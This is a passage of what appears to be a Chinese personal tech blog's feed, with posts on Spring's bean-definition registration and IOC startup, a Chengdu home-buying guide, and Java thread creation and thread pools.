class-name">BeanDefinitionStoreException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Failed to register bean definition with name '"</span> <span class="token operator">+</span>               bdHolder<span class="token punctuation">.</span><span class="token function">getBeanName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">,</span> ele<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Send registration event.</span>      <span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fireComponentRegistered</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BeanComponentDefinition</span><span class="token punctuation">(</span>bdHolder<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="DefaultListableBeanFactory-registerBeanDefinition"><a href="#DefaultListableBeanFactory-registerBeanDefinition" class="headerlink" title="DefaultListableBeanFactory  registerBeanDefinition"></a>DefaultListableBeanFactory  registerBeanDefinition</h3><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">@Overridepublic void registerBeanDefinition(String beanName, BeanDefinition beanDefinition)      throws BeanDefinitionStoreException &#123;   Assert.hasText(beanName, &quot;Bean name must not be empty&quot;);   Assert.notNull(beanDefinition, &quot;BeanDefinition must not be null&quot;);   if (beanDefinition instanceof AbstractBeanDefinition) &#123;      try &#123;         ((AbstractBeanDefinition) beanDefinition).validate();      &#125;      catch (BeanDefinitionValidationException ex) &#123;         throw new BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,               &quot;Validation of bean definition failed&quot;, ex);      &#125;   &#125;   BeanDefinition existingDefinition &#x3D; this.beanDefinitionMap.get(beanName);   &#x2F;&#x2F;如果不为空   if (existingDefinition !&#x3D; null) &#123;      if (!isAllowBeanDefinitionOverriding()) &#123;         throw new BeanDefinitionOverrideException(beanName, beanDefinition, existingDefinition);      &#125;      else if (existingDefinition.getRole() &lt; beanDefinition.getRole()) &#123;         &#x2F;&#x2F; e.g. was ROLE_APPLICATION, now overriding with ROLE_SUPPORT or ROLE_INFRASTRUCTURE         if (logger.isInfoEnabled()) &#123;            logger.info(&quot;Overriding user-defined bean definition for bean &#39;&quot; + beanName +                  &quot;&#39; with a framework-generated bean definition: replacing [&quot; +                  existingDefinition + &quot;] with [&quot; + beanDefinition + &quot;]&quot;);         &#125;      &#125;      else if (!beanDefinition.equals(existingDefinition)) &#123;         if (logger.isDebugEnabled()) &#123;            logger.debug(&quot;Overriding bean definition for bean &#39;&quot; + beanName +                  &quot;&#39; with a different definition: replacing [&quot; + existingDefinition +                  &quot;] with [&quot; + beanDefinition + &quot;]&quot;);         &#125;      &#125;      else &#123;         if (logger.isTraceEnabled()) &#123;            logger.trace(&quot;Overriding bean definition for bean &#39;&quot; + beanName +                  &quot;&#39; with an equivalent definition: replacing [&quot; + existingDefinition +                  &quot;] with [&quot; + beanDefinition + &quot;]&quot;);         &#125;      &#125;      this.beanDefinitionMap.put(beanName, beanDefinition);   &#125;   else &#123;      &#x2F;&#x2F; 没有则注册进去      if (hasBeanCreationStarted()) &#123;         &#x2F;&#x2F; Cannot modify startup-time collection elements anymore (for stable iteration)         synchronized (this.beanDefinitionMap) &#123;            &#x2F;&#x2F; 注册到beanDefinitionMap 中去            this.beanDefinitionMap.put(beanName, beanDefinition);            List&lt;String&gt; updatedDefinitions &#x3D; new ArrayList&lt;&gt;(this.beanDefinitionNames.size() + 1);            updatedDefinitions.addAll(this.beanDefinitionNames);            updatedDefinitions.add(beanName);            this.beanDefinitionNames &#x3D; updatedDefinitions;            removeManualSingletonName(beanName);         &#125;      &#125;      else &#123;         &#x2F;&#x2F; Still in startup registration phase         this.beanDefinitionMap.put(beanName, beanDefinition);         this.beanDefinitionNames.add(beanName);         removeManualSingletonName(beanName);      &#125;      this.frozenBeanDefinitionNames &#x3D; null;   &#125;   if (existingDefinition !&#x3D; null || containsSingleton(beanName)) &#123;      resetBeanDefinition(beanName);   &#125;   else if (isConfigurationFrozen()) &#123;      clearByTypeCache();   &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>到达这一步，整个基于xml 类型的解析得到beanDefinitionMap 对象就完成了</p><h2 id="分析流程图"><a href="#分析流程图" class="headerlink" title="分析流程图"></a>分析流程图</h2><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/BeanDefinition%E6%B5%81%E7%A8%8B.drawio.png" alt="BeanDefinition流程.drawio"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring源码</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-spring(一)-序章</title>
    <link href="/posts/2db10d0a.html"/>
    <url>/posts/2db10d0a.html</url>
    
    <content type="html"><![CDATA[<p> 快速了解spring IOC容器的启动流程</p><span id="more"></span><p>这里以我们开发常用的注解形式</p><ol><li>创建AnnotationConfigApplicationContext 对象，这个对象继承于GenericApplicationContext，而GenericApplicationContext对象中有DefaultListableBeanFactory；</li><li>创建 DefaultListableBeanFactory之后会解析和扫描注解上的所有bean信息封装成BeanDefinition信息，BeanDefinition中有Spring的所有bean的相关定义描述信息；</li><li>先将bean进行实例化，然后根据BeanDefinition的信息，底层采用反射的信息进行创建具体的bean对象；</li><li>将实例化后的bean对象放到一个Map中，后续应用就从Map中获取Bean对象，该Map也就是我们的IOC容器</li></ol><p>ps：其中有许多细节都没说，比如这里的Map 存在多个，解决了什么问题，创建的过程细节等等，接下来就开是进入源码解析的具体学习</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="源码版本"><a href="#源码版本" class="headerlink" title="源码版本"></a>源码版本</h2><p>  github地址  </p><p><a href="https://github.com/spring-projects/spring-framework/releases/tag/v5.3.10">https://github.com/spring-projects/spring-framework/releases/tag/v5.3.10</a></p><p>源码分析地址</p><p><a href="https://github.com/hyq965672903/sourcecode-learn-spring.git">https://github.com/hyq965672903/sourcecode-learn-spring.git</a></p><p>相关环境：</p><figure><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">1、操作系统：Windows102、JDK 版本：Jdk113、IDE 工具：IntelliJ IDEA 2021.2idea对应kotlin 编译版本 1.5.104、项目构建工具：gradle-7.25、spring 版本 5.3.10 当前spring kotlin 对应版本是1.5.30（根目录build.gradle中 搜 kotlin.jvm）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ps ：要注意当前的idea kotlin 插件版本和当前源码对应的kotlin版本，因为编译需要kotlin ，所以可能报错</p><h2 id="遇到的问题及解决方法"><a href="#遇到的问题及解决方法" class="headerlink" title="遇到的问题及解决方法"></a>遇到的问题及解决方法</h2><p>1、配置环境变量  GRADLE_USER_HOME</p><p>类似于maven 的本地仓库地址 </p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220423085321489.png" alt="image-20220423085321489"></p><p>2、IDEA gradle 配置说明</p><p>spring源码下gradle 文件夹-&gt;wrapper文件夹的gradle-wrapper.properties如下</p><figure><div class="code-wrapper"><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">distributionBase<span class="token operator">=</span>GRADLE_USER_HOMEdistributionPath<span class="token operator">=</span>wrapper<span class="token operator">/</span>distsdistributionUrl<span class="token operator">=</span>https\<span class="token punctuation">:</span><span class="token interpolation-string"><span class="token string">//</span></span>services<span class="token punctuation">.</span>gradle<span class="token punctuation">.</span>org<span class="token interpolation-string"><span class="token string">/distributions/</span></span>gradle<span class="token operator">-</span><span class="token number">7.2</span><span class="token operator">-</span>bin<span class="token punctuation">.</span>zipzipStoreBase<span class="token operator">=</span>GRADLE_USER_HOMEzipStorePath<span class="token operator">=</span>wrapper<span class="token operator">/</span>dists<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>IDEA需要配置一些东西来保证使用该wrapper 构建 如果不行 <strong><del>请删除 gradle user  home</del></strong></p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220423123042199.png" alt="image-20220423123042199"></p><p>3、根目录build.gradle 加入阿里云镜像仓库</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220423123220705.png" alt="image-20220423123220705"></p><figure><div class="code-wrapper"><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">maven <span class="token punctuation">&#123;</span>            url <span class="token string">'https://maven.aliyun.com/repository/central'</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><h1 id="Spring框架的整体流程"><a href="#Spring框架的整体流程" class="headerlink" title="Spring框架的整体流程"></a>Spring框架的整体流程</h1><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/Spring%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86%E5%9B%BE.jpg" alt="Spring架构原理图"></p><blockquote><p>图源自于 雷丰阳-设计模式</p></blockquote><p>整体流程分三大块</p><p>1、首先从各个环境读取bean定义信息，可以从本地xml,注解，或者网络、磁盘读取到文档信息Document</p><p>2、通过BeanDefinitionRegistry将信息读取为BeanDefinition 放入DefaultListableBeanFactory的beanDefinitionMap对象中去</p><p>3、通过BeanDefinition的Bean定义信息来创建我们所需要的对象，创建过程十分复杂</p><h2 id="核心接口"><a href="#核心接口" class="headerlink" title="核心接口"></a>核心接口</h2><h3 id="基础接口"><a href="#基础接口" class="headerlink" title="基础接口"></a>基础接口</h3><ul><li>Resource ResourceLoader </li><li>BeanFactory</li><li>BeanDefinition</li><li>BeanDefinitionReader</li><li>BeanDefinitionRegistry</li><li>ApplicationContext</li><li>Aware</li></ul><h3 id="生命周期-后置处理器"><a href="#生命周期-后置处理器" class="headerlink" title="生命周期-后置处理器"></a>生命周期-后置处理器</h3><ul><li>BeanFactoryPostProcessor</li><li>InitializingBean</li><li>BeanPostProcessor</li></ul><p><img src="/%E5%89%91%E6%8C%87%E6%BA%90%E7%A0%81-spring-%E4%B8%80-%E5%BA%8F%E7%AB%A0.assets/image-20220423161153634.png" alt="image-20220423161153634"></p><p>日常开发使用注解开发比较多，其核心就是 <strong>AnnotationConfigApplicationContext</strong> 作为入口进行对象解析开始直接流程的</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220423162300061.png" alt="image-20220423162300061"></p><p>GenericApplicationContext ：<br>private final DefaultListableBeanFactory beanFactory; </p><p>GenericApplicationContext 里面存在 DefaultListableBeanFactory  ，而DefaultListableBeanFactory  本质上又是一个档案馆，也就是第一大步骤获取到的bean定义信息等各种核心信息都会存到这里，后续IOC容器创建的bean信息来源基本上都来自于这里。</p><p>上面的含义也就是  AnnotationConfigApplicationContext 组合了档案馆信息</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BeanDefinition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>成都买房攻略</title>
    <link href="/posts/75c43f6b.html"/>
    <url>/posts/75c43f6b.html</url>
    
    <content type="html"><![CDATA[<p>成都买房攻略</p><span id="more"></span><h2 id="买房考虑的因素"><a href="#买房考虑的因素" class="headerlink" title="买房考虑的因素"></a>买房考虑的因素</h2><ul><li><p>房子的面积</p></li><li><p>房子的朝向</p></li><li><p>房子的楼层</p></li><li><p>周围交通，限号出行等</p></li><li><p>离学校距离</p><h2 id="购房指南"><a href="#购房指南" class="headerlink" title="购房指南"></a>购房指南</h2></li></ul><h3 id="自身购房资格"><a href="#自身购房资格" class="headerlink" title="自身购房资格"></a>自身购房资格</h3><ul><li>套数限制<ul><li>单身和非成都户籍的家庭只有在成都范围内无房的情况下才能再买房</li><li>两人及以上的家庭在成都有1套房或没有房才可以再购买新房，若是已有两套房，则不可再购买自有产权住房</li></ul></li><li>资格限制<ul><li>仅用社保买房：社保需满24个月</li><li>仅用户口买房：户口需满24个月</li><li>用社保+户口买房：户口未满24个月，社保需满12个月（社保满1年的情况下，落户就能买房）</li></ul></li><li>刚需可优先摇号、优先选房</li></ul><h3 id="买房资格"><a href="#买房资格" class="headerlink" title="买房资格"></a>买房资格</h3><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20210521204428.png" alt="微信截图_20210521204428"></p><h3 id="新房和二手房的差别点分析"><a href="#新房和二手房的差别点分析" class="headerlink" title="新房和二手房的差别点分析"></a>新房和二手房的差别点分析</h3><blockquote><p>增值税 </p></blockquote><blockquote><p>契税 </p></blockquote><blockquote><p>个税  </p></blockquote><h2 id="当前的预期"><a href="#当前的预期" class="headerlink" title="当前的预期"></a>当前的预期</h2><h3 id="新房的楼盘"><a href="#新房的楼盘" class="headerlink" title="新房的楼盘"></a>新房的楼盘</h3><table><thead><tr><th>楼盘</th><th>行政区域</th><th>地理位置</th><th>摇号情况</th><th>房屋面积(m2)</th><th>均价（万元&#x2F;m2）</th></tr></thead><tbody><tr><td>北辰鹿鸣院</td><td>双流</td><td>双流大源南三江公园旁</td><td>未</td><td>99-109</td><td>1.4-1.68</td></tr><tr><td>万科金域华府</td><td>天府新区</td><td>天府新区天府大道华阳地铁旁</td><td>未</td><td>109-135</td><td>待定</td></tr><tr><td>万科天府公园城</td><td>天府新区</td><td>天府新区华阳街道梓州大道</td><td>已摇号</td><td>108-126</td><td>1.46-1.75</td></tr></tbody></table><h3 id="二手房的楼盘"><a href="#二手房的楼盘" class="headerlink" title="二手房的楼盘"></a>二手房的楼盘</h3><table><thead><tr><th>楼盘</th><th>行政区域</th><th>地理位置</th><th>房屋面积(m2)</th><th>均价（万元&#x2F;m2）</th><th>挂牌价（万元）</th></tr></thead><tbody><tr><td>棠湖大厦</td><td>天府新区</td><td>南湖公园附近正西街附近</td><td>136</td><td>0.9476</td><td>129</td></tr><tr><td>南阳盛世二期</td><td>天府新区</td><td>天府新区南湖公园附近</td><td>115</td><td>1.7357</td><td>200</td></tr><tr><td>金桂花园</td><td>高新中和</td><td>高新中和</td><td>128</td><td>1.4</td><td>180</td></tr></tbody></table><h2 id="商贷与公积金"><a href="#商贷与公积金" class="headerlink" title="商贷与公积金"></a>商贷与公积金</h2><blockquote><p>社保 贷款额度</p></blockquote><p><strong>成都的房贷利率：</strong></p><p>​    商贷一般是6.12（部分银行5.88）</p><p>​    公积金贷款是3.25，单人可带40，双人70</p><p><strong>贷款限制：</strong></p><p>连续缴纳公积金6个月以上，</p><p>6个月以上可贷款金额是 0.5x公积金余额x20</p><p>12个月以上可贷款金额是 0.9x公积金余额x20</p><p>24个月以上可贷款金额是 1x公积金余额x20</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Java并发多线程与高并发(六)-线程池</title>
    <link href="/posts/2e7e1308.html"/>
    <url>/posts/2e7e1308.html</url>
    
    <content type="html"><![CDATA[<p>针对性的学习线程池框架 ExecutorService ，包括核心概念，核心参数，创建使用等</p><span id="more"></span><h2 id="创建线程的方式"><a href="#创建线程的方式" class="headerlink" title="创建线程的方式"></a>创建线程的方式</h2><h3 id="继承Thread"><a href="#继承Thread" class="headerlink" title="继承Thread"></a>继承Thread</h3><ul><li>定义类继承Thread，重写run方法（线程执行的内容），又叫执行体</li><li>创建Thread继承类的实例，调用start()启动线程</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>concurrency<span class="token punctuation">.</span>thread</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2021灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2021/5/16 * @description: */</span><span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadExample1</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 重写run方法     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"继承thread开启线程"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">new</span> <span class="token class-name">ThreadExample1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="实现Runable"><a href="#实现Runable" class="headerlink" title="实现Runable"></a>实现Runable</h3><ul><li><p>定义类实现runable，重写run方法（线程执行的内容），又叫执行体</p></li><li><p>创建Runnable实现类的实例, new Thread作为入参传递。得到一个线程对象</p></li><li><p>调用start()启动线程</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>concurrency<span class="token punctuation">.</span>thread</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2021灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2021/5/16 * @description: */</span><span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadExample2</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 重写run方法     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"实现Runnable开启线程"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ThreadExample2</span> threadExample2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadExample2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>threadExample2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure></li></ul><h3 id="实现-Callable-，并结合-Future"><a href="#实现-Callable-，并结合-Future" class="headerlink" title="实现 Callable ，并结合 Future"></a>实现 Callable ，并结合 Future</h3><ul><li>定义Callable接口的实现类，实现call()方法，又叫执行体，并且定义<strong>返回值</strong>类型</li><li>创建Callable实现类的实例，使用FutureTask类来包装Callable对象，并且FutureTask返回类型和Callable的返回类型一致</li><li>new Thread，FutureTask做入参得到一个Thread线程对象</li><li>调用Thread的start()方法，执行开启线程</li><li>调用FutureTask对象的get()方法，得到子线程返回值</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>concurrency<span class="token punctuation">.</span>thread</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Callable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutionException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">FutureTask</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2021灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2021/5/16 * @description: */</span><span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadExample3</span> <span class="token keyword">implements</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ExecutionException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ThreadExample3</span> threadExample3 <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ThreadExample3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FutureTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> futureTask <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FutureTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>threadExample3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>futureTask<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Integer</span> integer <span class="token operator">=</span> futureTask<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"子线程返回的值"</span><span class="token operator">+</span>integer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="使用线程池创建线程（这里介绍JDK自带的Executors-）"><a href="#使用线程池创建线程（这里介绍JDK自带的Executors-）" class="headerlink" title="使用线程池创建线程（这里介绍JDK自带的Executors ）"></a>使用线程池创建线程（这里介绍JDK自带的Executors ）</h2><p>除了上述三种创建线程的方式，我们还可以通过线程池来创建线程</p><h3 id="new-Thread-的弊端"><a href="#new-Thread-的弊端" class="headerlink" title="new Thread 的弊端"></a>new Thread 的弊端</h3><ul><li>每次都new对象，性能差，复用性差</li><li>缺乏线程之间统一管理，造成资源浪费甚至可能内存溢出</li><li>缺乏更多功能，如定时执行、定期执行、线程中断。</li></ul><h3 id="线程池的好处"><a href="#线程池的好处" class="headerlink" title="线程池的好处"></a>线程池的好处</h3><ul><li>重用存在的线程，减少对象创建、消亡的开销，性能佳。</li><li>可有效控制最大并发线程数，提高系统资源的使用率，同时避免过多资源竞争，避免堵塞。</li><li>提供定时执行、定期执行、单线程、并发数控制等功能。</li></ul><h3 id="线程池核心概念及参数介绍"><a href="#线程池核心概念及参数介绍" class="headerlink" title="线程池核心概念及参数介绍"></a>线程池核心概念及参数介绍</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ThreadPoolExecutor</span><span class="token punctuation">(</span><span class="token keyword">int</span> corePoolSize<span class="token punctuation">,</span>                            <span class="token keyword">int</span> maximumPoolSize<span class="token punctuation">,</span>                            <span class="token keyword">long</span> keepAliveTime<span class="token punctuation">,</span>                            <span class="token class-name">TimeUnit</span> unit<span class="token punctuation">,</span>                            <span class="token class-name">BlockingQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Runnable</span><span class="token punctuation">></span></span> workQueue<span class="token punctuation">,</span>                            <span class="token class-name">ThreadFactory</span> threadFactory<span class="token punctuation">,</span>                            <span class="token class-name">RejectedExecutionHandler</span> handler<span class="token punctuation">)</span> <span aria-hidden="true" 